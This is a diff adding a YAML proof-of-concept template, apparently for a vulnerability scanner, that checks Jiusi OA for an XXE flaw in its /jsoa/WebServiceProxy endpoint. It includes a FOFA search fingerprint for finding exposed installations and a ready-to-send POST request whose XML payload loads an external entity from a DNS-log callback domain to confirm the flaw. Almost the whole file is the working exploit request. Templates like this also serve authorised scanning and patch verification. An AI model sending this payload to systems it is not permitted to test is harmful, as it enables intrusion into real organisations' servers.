@@ -1,0 +1,20 @@
+id: poc-yaml-jiusi-oa-webserviceproxy-xxe
+info:
+  name: 九思OA WebServiceProxy XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 九思OA
+  fofa: app="九思软件-OA"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /jsoa/WebServiceProxy
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{.domain}}"> %remote;]>
+  expression: reverse.Verify()
+transport: http
